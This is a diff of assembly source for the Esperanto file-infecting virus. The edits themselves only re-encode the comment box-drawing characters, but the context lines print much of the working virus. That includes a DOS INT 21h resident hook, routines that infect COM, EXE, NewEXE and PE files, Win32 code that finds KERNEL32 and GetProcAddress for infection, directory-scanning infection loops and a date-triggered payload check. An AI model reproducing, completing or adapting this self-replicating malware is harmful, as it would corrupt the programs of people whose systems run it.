+; â•â•â•£ Windows 3.1x module â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 newexe_entry:   pusha                               ; Push our registers
                 push    ds es                       ; And save segments
@@ -1133,7 +1133,7 @@ restore_ne:     pop     es ds                       ; Pop our segments and
 newexe_ip       dw      ?                           ; Original offset
 newexe_cs       dw      0ffffh                      ; Original segment
 
-; ÍÍ¹ DOS memory resident module ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+; â•â•â•£ DOS memory resident module â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 new_int_21h:    cmp     ax,':)'                     ; Our residency check?
                 jne     more_checks                 ; Nope, more checks...
@@ -1150,7 +1150,7 @@ more_checks:    cmp     ah,4eh                      ; Find first file?
 return_to_int:  db      0eah                        ; jmp xxxx:xxxx
 old_int_21h     dw      ?,?                         ; Original int 21h
 
-; ÄÄ´ Findfirst (4eh) service ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Findfirst (4eh) service â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 findfirst:      pusha                               ; Push'em onto the stack
                 push    es cs                       ; Push ES as well so we
@@ -1178,7 +1178,7 @@ update_offset:  mov     word ptr cs:[file_offset],di ; New filename offset
 no_more_path:   pop     es                          ; Restore ES from stack
                 popa                                ; And the other registers
 
-; ÄÄ´ Findnext (4fh) service ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Findnext (4fh) service â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 findnext:       pushf                               ; Push flags in the stack
                 call    dword ptr cs:[old_int_21h]  ; Call original int 21h
@@ -1220,7 +1220,7 @@ not_a_dot:      or      al,al                       ; End of filename?
                 cmp     word ptr ds:[di],'OC'       ; Maybe a COM file?
                 jne     pop_and_leave               ; If not, pop and leave
 
-; ÄÄ´ COM files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ COM files check routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 check_com:      push    ds es                       ; DS = ES (to open files
                 pop     ds                          ; in DS:DX and ES:DX)
@@ -1249,7 +1249,7 @@ check_com:      push    ds es                       ; DS = ES (to open files
                 cmp     ax,(espo_file_size+3e8h)    ; And now see if it's
                 jbe     close_and_pop               ; too small (virus+1000)
 
-; ÄÄ´ COM files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ COM files infection routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 infect_com:     mov     byte ptr ds:[file_flag],'C' ; Set the COM flag in
                 inc     byte ptr ds:[inf_counter]   ; Increment the counter
@@ -1290,7 +1290,7 @@ memory_exit:    pop     es ds                       ; Jump back to the int
                 popf                                ; on intercepting 4eh
                 retf    2                           ; and 4fh to infect
 
-; ÄÄ´ EXE files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ EXE files check routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 check_exe:      push    ds es                       ; DS = ES (to open files
                 pop     ds                          ; in DS:DX and ES:DX)
@@ -1331,7 +1331,7 @@ check_exe:      push    ds es                       ; DS = ES (to open files
                 cmp     byte ptr ds:[si+18h],40h    ; Is it a WinXX file?
                 je      check_winexe                ; Yep, go for it!
 
-; ÄÄ´ EXE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ EXE files infection routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 infect_exe:     mov     byte ptr ds:[file_flag],'E' ; Set the EXE flag in
                 inc     byte ptr ds:[inf_counter]   ; Increment the counter
@@ -1384,7 +1384,7 @@ infect_exe:     mov     byte ptr ds:[file_flag],'E' ; Set the EXE flag in
                 int     21h                         ; instead of the old one
 go_away:        jmp     close_and_pop               ; Close file and exit
 
-; ÄÄ´ NewEXE files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ NewEXE files check routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 check_winexe:   lea     di,winexe_data              ; Point to our buffer
                 mov     ax,word ptr ds:[si+3ch]     ; Save the pointer to
@@ -1434,7 +1434,7 @@ bad_winexe:     mov     ah,3fh                      ; file and read again
                 int     21h                         ; by DS:DX and DS:SI)
                 jmp     close_and_pop               ; Close file and exit
 
-; ÄÄ´ NewEXE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ NewEXE files infection routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 infect_newexe:  inc     byte ptr ds:[inf_counter]   ; Increment the counter
                 mov     ax,word ptr ds:[si+22h]     ; Distance to seg.table
@@ -1578,7 +1578,7 @@ no_extra:       push    di                           ; Push DI onto stack
                 int     21h                         ; 4743 bytes bigger!
                 jmp     go_away                     ; Close it and exit
 
-; ÄÄ´ PE files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ PE files check routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 check_pe:       call    lseek_start                 ; Lseek to the start
                 mov     ah,3fh                      ; of the file and
@@ -1769,7 +1769,7 @@ more_imd_imge:  pop     ebp eax
                 add     ebp,IMAGE_SIZEOF_IMPORT_DESCRIPTOR
                 jmp     next_imd_imge
 
-; ÄÄ´ PE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ PE files infection routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 infect_pe:      inc     byte ptr ds:[inf_counter]   ; Increment inf.counter
                 mov     si,bp                       ; SI = BP -> read buffer
@@ -1899,21 +1899,21 @@ virtual_ok:     pop     eax
                 int     21h
                 jmp     go_away
 
-; ÍÍ¹ Subroutines ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+; â•â•â•£ Subroutines â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 ;
-;  Note: the following subroutines are used by the DOS and Windows 3.1x mo-
+;   Note: the following subroutines are used by the DOS and Windows 3.1x mo-
 ;   dules, in order to perform many repeated actions such as lseeking to the
 ;   start or the end of a file, finding RVAs, and so on.
 
-; ÄÄ´ Lseek to the start of a file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Lseek to the start of a file â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ;
-;  Entry:
-;     ş BX => file handle
-;     ş File pointer somewhere in the file
+;   Entry:
+;     â–  BX => file handle
+;     â–  File pointer somewhere in the file
 ;
-;  Exit:
-;     ş BX => file handle
-;     ş File pointer in the start of the file
+;   Exit:
+;     â–  BX => file handle
+;     â–  File pointer in the start of the file
 
 lseek_start:    mov     ax,4200h                    ; Lseek function, with
                 xor     cx,cx                       ; AL, CX and DX = 0,
@@ -1921,31 +1921,31 @@ lseek_start:    mov     ax,4200h                    ; Lseek function, with
                 int     21h                         ; the file in BX
                 ret                                 ; And go back to code
 
-; ÄÄ´ Lseek to the middle of a file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Lseek to the middle of a file â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ;
-;  Entry:
-;     ş BX => file handle
-;     ş DX => seek offset
-;     ş File pointer somewhere in the file
+;   Entry:
+;     â–  BX => file handle
+;     â–  DX => seek offset
+;     â–  File pointer somewhere in the file
 ;
-;  Exit:
-;     ş BX => file handle
-;     ş File pointer = previous DX value
+;   Exit:
+;     â–  BX => file handle
+;     â–  File pointer = previous DX value
 
 lseek_middle:   mov     ax,4200h                    ; Lseek function, the
                 xor     cx,cx                       ; offset where to seek
                 int     21h                         ; is specified in CX
                 ret                                 ; Return to our caller
 
-; ÄÄ´ Lseek to the end of a file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Lseek to the end of a file â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ;
-;  Entry:
-;     ş BX => file handle
-;     ş File pointer somewhere in the file
+;   Entry:
+;     â–  BX => file handle
+;     â–  File pointer somewhere in the file
 ;
-;  Exit:
-;     ş BX => file handle
-;     ş File pointer in the end of the file
+;   Exit:
+;     â–  BX => file handle
+;     â–  File pointer in the end of the file
 
 lseek_end:      mov     ax,4202h                    ; Lseek function, with
                 xor     cx,cx                       ; AL=2 (from bottom),
@@ -1953,16 +1953,16 @@ lseek_end:      mov     ax,4202h                    ; Lseek function, with
                 int     21h                         ; zero -> lseek to end
                 ret                                 ; Return to main code
 
-; ÄÄ´ Look for the RVA of a given API by name ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Look for the RVA of a given API by name â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ;
-;  Entry:
-;     ş EDX    => Section ëelta-offset
-;     ş DS:ESI => Import address table for KERNEL32.DLL
-;     ş DS:EDI => Given API name to look for
-;     ş EBP    => Buffer start address
+;   Entry:
+;     â–  EDX    => Section Î´elta-offset
+;     â–  DS:ESI => Import address table for KERNEL32.DLL
+;     â–  DS:EDI => Given API name to look for
+;     â–  EBP    => Buffer start address
 ;
-;  Exit:
-;      EAX    => RVA of the given IMD, or 0 if error
+;   Exit:
+;       EAX    => RVA of the given IMD, or 0 if error
 
 search_name:    push    ds
                 pop     es
@@ -2025,20 +2025,20 @@ stupid_jump:    sub     eax,ebp
 inp_notfound:   xor     eax,eax
                 ret
 
-; ÄÄ´ Check system conditions before infection ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Check system conditions before infection â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ;
-;  Entry:
-;     ş BX => handle of possible victim
-;     ş Infection counter holding a value 0-3
-;     ş Infection timer holding a certain value
+;   Entry:
+;     â–  BX => handle of possible victim
+;     â–  Infection counter holding a value 0-3
+;     â–  Infection timer holding a certain value
 ;
-;  Good exit:
-;     ş AH => 2ch
+;   Good exit:
+;     â–  AH => 2ch
 ;
-;  Exit with error:
-;     ş AH => 0
-;     ş Infection counter set to 0
-;     ş Infection timer updated
+;   Exit with error:
+;     â–  AH => 0
+;     â–  Infection counter set to 0
+;     â–  Infection timer updated
 
 system_checks:  mov     ah,2ch                      ; Get system time to
                 int     21h                         ; do our inf.checks
@@ -2056,7 +2056,7 @@ set_error:      cbw                                 ; Set AH=0
                 mov     byte ptr ds:[inf_timer],cl  ; Update the timer
 go_for_it:      ret                                 ; And return
 
-; ÍÍ¹ Win32 module ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+; â•â•â•£ Win32 module â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
                 .386p                               ; Intel 80386+ PMODE
 espow32_start   label   byte                        ; Define 32-bit start
@@ -2064,11 +2064,11 @@ espow32_start   label   byte                        ; Define 32-bit start
 first_entry:    push    eax                         ; Push for later use
 pe_entry:       pushad                              ; Push all the stuff
 
-                call    delta_offset                ; Get ëelta-offset
+                call    delta_offset                ; Get Î´elta-offset
 dseta_byte      label   byte                        ; Dseta-offset marker
 delta_offset:   pop     ebp                         ; Get return address
                 mov     ebx,ebp                     ; Store it in EBX
-                sub     ebp,offset delta_offset     ; Get ëelta in EBP
+                sub     ebp,offset delta_offset     ; Get Î´elta in EBP
 
                 ; Get the base address of our host in
                 ; EBX, by means of substracting its
@@ -2157,7 +2157,7 @@ find_more_api:  lodsd
                 stosd
                 loop    find_more_api
 
-; ÄÄ´ Payload checking routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Payload checking routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
                 ; Now it's time to check for our activation
                 ; date (july 26th, when, in 1887, the first
@@ -2229,7 +2229,7 @@ decrypt_text:   lodsb
                 call    eax
                 jmp     jump_to_host
 
-; ÄÄ´ File searching routine (FindFirstFileA-based) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ File searching routine (FindFirstFileA-based) â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
                 ; Look for first file in current directory
                 ; by means of the API FindFirstFileA, and
@@ -2244,7 +2244,7 @@ find_first:     mov     byte ptr [ebp+inf_counter],0
                 cmp     eax,0ffffffffh
                 je      jump_to_host
 
-; ÄÄ´ File checking routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ File checking routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
                 ; Save the handle of the found file and
                 ; check for its size, just to see if it's
@@ -2299,7 +2299,7 @@ find_dot:       inc     byte ptr [ebp+max_path_size]
                 ; Seems so... first check for the MZ mark
                 ; as the first doubleword in the header
 
-; ÄÄ´ EXE files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ EXE files check routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 check32_exe:    cmp     word ptr [ebx],'ZM'
                 jne     unmap_n_close
@@ -2330,7 +2330,7 @@ check32_exe:    cmp     word ptr [ebx],'ZM'
                 ; At this point we know it is a DOS EXE
                 ; file... we're gonna infect it for sure
 
-; ÄÄ´ EXE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ EXE files infection routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 infect32_exe:   mov     byte ptr [ebp+file_flag],'E'
                 inc     byte ptr [ebp+inf_counter]
@@ -2426,7 +2426,7 @@ infect32_exe:   mov     byte ptr [ebp+file_flag],'E'
                 ; Check if the COM file has been previously
                 ; infected by Esperanto (winky ";)" smiley)
 
-; ÄÄ´ COM files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ COM files check routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 check32_com:    cmp     word ptr [ebx+3],');'
                 je      unmap_n_close
@@ -2435,7 +2435,7 @@ check32_com:    cmp     word ptr [ebx+3],');'
                 ; infection counter and memory map the file
                 ; with our size previously added
 
-; ÄÄ´ COM files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ COM files infection routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 infect32_com:   mov     byte ptr [ebp+file_flag],'C'
                 inc     byte ptr [ebp+inf_counter]
@@ -2486,7 +2486,7 @@ infect32_com:   mov     byte ptr [ebp+file_flag],'C'
                 ; first comparing the starting doubleword
                 ; of the new header with "PE"
 
-; ÄÄ´ PE files check routine (I) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ PE files check routine (I) â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 check32_pe:     mov     esi,dword ptr [ebx+MZ_lfanew]
                 add     esi,ebx
@@ -2611,7 +2611,7 @@ check_char:     scasb
                 cmp     eax,dword ptr [edi+ID_TimeDateStamp]
                 jne     find_rvas
 
-; ÄÄ´ File searching routine (FindNextFileA-based) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ File searching routine (FindNextFileA-based) â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
                 ; Memory unmap file handled in EBX, check
                 ; the infection counter and, if everything
@@ -2639,7 +2639,7 @@ find_next:      cmp     byte ptr [ebp+inf_counter],3
 jump_to_host:   popad
                 ret
 
-; ÄÄ´ PE files check routine (II) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ PE files check routine (II) â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
                 ; Go to next imported module descriptor
 
@@ -2667,7 +2667,7 @@ find_rvas:      push    esi
                 call    look4name
                 mov     dword ptr [ebp+gpaddress_rva],eax
 
-; ÄÄ´ PE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ PE files infection routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
                 ; Increment infection counter and remap our
                 ; victim in memory with the virus size added
@@ -2784,21 +2784,21 @@ virtsize_ok:    pop     eax
                 rep     movsb
 no_good:        jmp     unmap_n_close
 
-; ÍÍ¹ Subroutines ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+; â•â•â•£ Subroutines â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 ;
-;  Note: the following subroutines are used by the Win32 module in order to
+;   Note: the following subroutines are used by the Win32 module in order to
 ;   perform many repeated actions, such as mapping or unmapping a file, fin-
 ;   ding RVAs or the base address of a given module or API, and so on.
 
-; ÄÄ´ Undocumented way to find the address of K32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Undocumented way to find the address of K32 â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ;
-;  Entry:
-;     ş EBX => base address of host
-;     ş Necessity to find KERNEL32.DLL
+;   Entry:
+;     â–  EBX => base address of host
+;     â–  Necessity to find KERNEL32.DLL
 ;
-;  Exit:
-;     ş EAX => base address of KERNEL32.DLL
-;     ş EBX => base address of host
+;   Exit:
+;     â–  EAX => base address of KERNEL32.DLL
+;     â–  EBX => base address of host
 
                 ; Try to get the base address of KERNEL32
                 ; by means of ID_ForwarderChain. This is
@@ -2827,16 +2827,16 @@ kernel32_rva    dd      ?
 k32_not_found:  popad
                 ret
 
-; ÄÄ´ Undocumented way to find the address of GetProcAddress ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Undocumented way to find the address of GetProcAddress â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ;
-;  Entry:
-;     ş EBX        => base address of host
-;     ş kernel32_a => base address of KERNEL32.DLL
-;     ş Necessity to find GetProcAddress
+;   Entry:
+;     â–  EBX        => base address of host
+;     â–  kernel32_a => base address of KERNEL32.DLL
+;     â–  Necessity to find GetProcAddress
 ;
-;  Exit:
-;     ş EAX        => address of GetProcAddress
-;     ş EBX        => base address of host
+;   Exit:
+;     â–  EAX        => address of GetProcAddress
+;     â–  EBX        => base address of host
 
                 ; This undocumented way to get the address
                 ; of the API GetProcAddress is based on
@@ -2951,13 +2951,13 @@ gpa_aborted:    pop     ebx
                 popad
                 ret
 
-; ÄÄ´ Map a file in memory ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Map a file in memory â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ;
-;  Entry:
-;     ş WFD_szFileName => file to memory-map
+;   Entry:
+;     â–  WFD_szFileName => file to memory-map
 ;
-;  Exit:
-;     ş EBX => handle of memory-mapped file
+;   Exit:
+;     â–  EBX => handle of memory-mapped file
 
                 ; Open existing file
 
@@ -3003,13 +3003,13 @@ open_map_file:  push    0
                 jz      close_mapping
                 ret
 
-; ÄÄ´ Unmap a file in memory ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Unmap a file in memory â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ;
-;  Entry:
-;     ş EBX => handle of memory-mapped file
+;   Entry:
+;     â–  EBX => handle of memory-mapped file
 ;
-;  Exit:
-;     ş EBX => null, file unmapped
+;   Exit:
+;     â–  EBX => null, file unmapped
 
                 ; Unmap view of file
 
@@ -3035,15 +3035,15 @@ close_handle:   push    dword ptr [ebp+crfhandle]
 exit_mapping:   xor     ebx,ebx
                 ret
 
